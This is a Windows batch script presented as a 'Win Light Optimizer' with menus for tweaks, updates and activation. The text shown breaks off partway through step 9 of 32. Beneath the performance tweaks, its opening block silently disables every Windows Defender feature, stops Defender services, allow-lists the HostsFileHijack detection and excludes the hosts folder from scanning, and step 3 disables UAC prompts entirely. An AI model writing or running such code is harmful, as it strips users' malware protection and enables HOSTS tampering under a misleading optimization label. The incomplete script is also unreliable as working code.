@echo off
setlocal enabledelayedexpansion
title Win Light Optimizer
color 0A

:: Check for admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: Please run this script as Administrator!
    pause
    exit /b
)

:MAIN_MENU
cls
color 0A
echo.
echo  =====================================================
echo        Win Light Optimizer
echo  =====================================================
echo.
echo   [1]  System Optimizations
echo   [2]  Clean Temp Files
echo   [3]  Windows Update  (Enable / Disable)
echo   [4]  Windows Activation
echo   [0]  Exit
echo.
echo  =====================================================
echo.
set "MENU_CHOICE="
set /p MENU_CHOICE="  Select option: "
echo.
if "%MENU_CHOICE%"=="1" goto :OPT1
if "%MENU_CHOICE%"=="2" goto :OPT2
if "%MENU_CHOICE%"=="3" goto :OPT3
if "%MENU_CHOICE%"=="4" goto :OPT4
if "%MENU_CHOICE%"=="0" goto :EXIT
echo  Invalid option, try again.
timeout /t 2 >nul
goto :MAIN_MENU

:: ====================================================
::  OPTION 1 - SYSTEM OPTIMIZATIONS
:: ====================================================
:OPT1
cls
echo.
echo.

:: Counters and failed step list
@echo off
set PASS=0
set FAIL=0
set "_FAILS=%TEMP%\opt_fails_%RANDOM%.txt"
if exist "!_FAILS!" del "!_FAILS!" >nul 2>&1

:: Disable ALL Defender protection for the duration of this script
echo Disabling Windows Defender...
:: PowerShell method - disables every feature
powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableScriptScanning $true -DisableIntrusionPreventionSystem $true -EnableNetworkProtection Disabled -EnableControlledFolderAccess Disabled -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -PUAProtection Disabled -ErrorAction SilentlyContinue" >nul 2>&1
:: Registry method - backup in case Tamper Protection blocks PowerShell commands
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine" /v "EnableFileHashComputation" /t REG_DWORD /d 0 /f >nul 2>&1
:: Allow SettingsModifier:Win32/HostsFileHijack specifically so Defender never restores the HOSTS file
powershell -NoProfile -Command "Add-MpPreference -ThreatIDDefaultAction_Ids 2147728987,2147735501 -ThreatIDDefaultAction_Actions Allow,Allow -ErrorAction SilentlyContinue" >nul 2>&1
:: Stop the Defender services so they cannot intercept or revert HOSTS file writes
sc config WinDefend start= disabled >nul 2>&1
net stop WinDefend /y >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1
net stop WdNisSvc /y >nul 2>&1
:: Add exclusion for the hosts folder so writes to it are never scanned
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '$env:SystemRoot\System32\drivers\etc' -ErrorAction SilentlyContinue" >nul 2>&1
echo  [OK] Defender disabled
echo.

:: ================================================
:: STEP 1 - Visual Performance
:: ================================================
echo [STEP 1/32] Adjusting Visual Performance...
set STEP_ERR=0
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d 2 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "TaskbarAnimations" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "WindowAnimations" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "IconsOnly" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ThumbnailCacheSize" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "FontSmoothing" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Desktop" /v "VisualFXSetting" /t REG_DWORD /d 2 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "MenuAnimations" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Visual Performance
    set /a PASS+=1
) else (
    echo  [FAIL] Visual Performance
    set /a FAIL+=1
    echo Visual Performance>> "!_FAILS!"
)

:: ================================================
:: STEP 2 - Timeout Tweaks
:: ================================================
echo [STEP 2/32] Applying Timeout Tweaks...
set STEP_ERR=0
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f >nul 2>&1 || set STEP_ERR=1
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f >nul 2>&1 || set STEP_ERR=1
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "1000" /f >nul 2>&1 || set STEP_ERR=1
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f >nul 2>&1 || set STEP_ERR=1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "1000" /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Timeout Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Timeout Tweaks
    set /a FAIL+=1
    echo Timeout Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 3 - Registry Tweaks
:: ================================================
echo [STEP 3/32] Applying Registry Tweaks...
set STEP_ERR=0
REG ADD "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoTileApplicationNotification" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\Control Panel\Desktop" /v "SmoothScroll" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKCU\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags\AllFolders\Shell" /v "FolderType" /t REG_SZ /d "NotSpecified" /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "HideFastUserSwitching" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Disable UAC prompts entirely
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\WindowsInkWorkspace" /v "AllowWindowsInkWorkspace" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatency" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "ExitLatencyCheckEnabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Latency" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceFSVP" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyTolerancePerfOverride" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceScreenOffIR" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "LatencyToleranceVSyncEnabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "RtlCapabilityCheckLatency" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyActivelyUsed" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleLongTime" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleMonitorOff" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleNoContext" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleShortTime" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultD3TransitionLatencyIdleVeryLongTime" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle0MonitorOff" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceIdle1MonitorOff" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceMemory" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContext" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceNoContextMonitorOff" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceOther" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "DefaultLatencyToleranceTimerPeriod" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "TransitionLatency" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Registry Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Registry Tweaks
    set /a FAIL+=1
    echo Registry Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 4 - CPU Tweaks
:: ================================================
echo [STEP 4/32] Applying CPU Tweaks...
set STEP_ERR=0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d 42 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergyEstimationEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergySaverPolicy" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CsEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable CPU idle states to prevent latency spikes
powercfg -setacvalueindex SCHEME_CURRENT SUB_PROCESSOR IDLEDISABLE 1 >nul 2>&1
powercfg -setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR IDLEDISABLE 1 >nul 2>&1
powercfg -setactive SCHEME_CURRENT >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] CPU Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] CPU Tweaks
    set /a FAIL+=1
    echo CPU Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 5 - Display Tweaks
:: ================================================
echo [STEP 5/32] Applying Display Tweaks...
set STEP_ERR=0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\ModernSleep" /v "AdaptiveRefreshRate" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "VideoIdleTimeout" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "PowerSavingModeEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "PanelSelfRefresh" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "ForceOffScreenTimeout" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Display Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Display Tweaks
    set /a FAIL+=1
    echo Display Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 6 - GPU Tweaks
:: ================================================
echo [STEP 6/32] Applying GPU Tweaks...
set STEP_ERR=0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableFrameBufferCompression" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "EnableGpuBoost" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDrv" /v "Start" /t REG_DWORD /d 4 /f >nul 2>&1 || set STEP_ERR=1
:: Enable Hardware-Accelerated GPU Scheduling (HAGS) - reduces CPU-GPU latency
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "HwSchMode" /t REG_DWORD /d 2 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] GPU Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] GPU Tweaks
    set /a FAIL+=1
    echo GPU Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 7 - Network Tweaks
:: ================================================
echo [STEP 7/32] Applying Network Tweaks...
set STEP_ERR=0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001" /v "PnPCapabilities" /t REG_DWORD /d 36 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0002" /v "PnPCapabilities" /t REG_DWORD /d 36 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisablePowerManagement" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: TCP/IP tweaks
netsh int tcp set global dca=enabled >nul 2>&1 || set STEP_ERR=1
netsh int tcp set global netdma=enabled >nul 2>&1 || set STEP_ERR=1
netsh interface isatap set state disabled >nul 2>&1 || set STEP_ERR=1
netsh int tcp set global timestamps=disabled >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "0" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxConnectRetransmissions" /t REG_DWORD /d "1" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DelayedAckFrequency" /t REG_DWORD /d "1" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DelayedAckTicks" /t REG_DWORD /d "1" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MultihopSets" /t REG_DWORD /d "15" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "50" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\System\CurrentControlSet\Services\Tcpip\QoS" /v "Do not use NLA" /t REG_DWORD /d "1" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "0" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "EnableAutoDoh" /t REG_DWORD /d "2" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "NonBlockingSendSpecialBuffering" /t REG_DWORD /d "1" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\Software\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d 0xFFFFFFFF /f >nul 2>&1 || set STEP_ERR=1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: AFD tweaks
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "BufferAlignment" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DefaultReceiveWindow" /t REG_DWORD /d 262144 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DefaultSendWindow" /t REG_DWORD /d 262144 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DisableAddressSharing" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DisableChainedReceive" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DisableDirectAcceptEx" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DoNotHoldNICBuffers" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicSendBufferDisable" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "FastSendDatagramThreshold" /t REG_DWORD /d 1024 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "FastCopyReceiveThreshold" /t REG_DWORD /d 1024 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "IgnoreOrderlyRelease" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "IgnorePushBitOnReceives" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Disable Network Discovery (resource ID is language-neutral, works on any Windows language)
netsh advfirewall firewall set rule group="@FirewallAPI.dll,-32752" new enable=No >nul 2>&1
netsh advfirewall firewall set rule group="Network Discovery" new enable=No >nul 2>&1
REG ADD "HKLM\System\CurrentControlSet\Control\Network" /v "NewNetworkWindowOff" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Disable IPv6 on all adapters and system-wide
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters" /v "DisabledComponents" /t REG_DWORD /d 0xFF /f >nul 2>&1 || set STEP_ERR=1
powershell -NoProfile -Command "Get-NetAdapter | ForEach-Object { Disable-NetAdapterBinding -Name $_.Name -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue }" >nul 2>&1
:: Set DNS: primary 1.1.1.1, secondary 8.8.8.8 on all active adapters
powershell -NoProfile -Command "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | ForEach-Object { Set-DnsClientServerAddress -InterfaceIndex $_.InterfaceIndex -ServerAddresses @('1.1.1.1','8.8.8.8') }" >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Network Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Network Tweaks
    set /a FAIL+=1
    echo Network Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 8 - System and USB Tweaks
:: ================================================
echo [STEP 8/32] Applying System Tweaks...
set STEP_ERR=0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergySaverStatus" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "DynamicThrottlePolicy" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EcoMode" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Kernel" /v "GlobalTimerResolutionRequests" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USB\Parameters" /v "DisableSelectiveSuspend" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\HidUsb\Parameters" /v "SelectiveSuspendEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USBXHCI\Parameters" /v "EnhancedPowerManagementEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USBXHCI\Parameters" /v "DisableLegacyUSBSupport" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\usbaudio\Parameters" /v "PowerSettings" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\HidUsb\Parameters" /v "DeviceIdleEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USBHUB3\Parameters" /v "SelectiveSuspendEnabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\HidUsb\Parameters" /v "DisableWakeFromSuspend" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USB\Parameters" /v "ForceHCResetOnResume" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USB" /v "DisableSelectiveSuspend" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\USBXHCI\Parameters" /v "DisableSelectiveSuspend" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] System and USB Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] System and USB Tweaks
    set /a FAIL+=1
    echo System and USB Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 9 - Boot and CPU Scheduler Tweaks
:: ================================================
echo [STEP 9/32] Applying Boot and CPU Scheduler Tweaks...
set STEP_ERR=0
bcdedit /set bootux disabled >nul 2>&1 || set STEP_ERR=1
bcdedit /set tscsyncpolicy enhanced >nul 2>&1 || set STEP_ERR=1
bcdedit /set uselegacyapicmode No >nul 2>&1 || set STEP_ERR=1
bcdedit /set x2apicpolicy Enable >nul 2>&1 || set STEP_ERR=1
bcdedit /deletevalue useplatformclock >nul 2>&1
bcdedit /deletevalue useplatformtick >nul 2>&1
bcdedit /set disabledynamictick yes >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] Boot and CPU Scheduler Tweaks
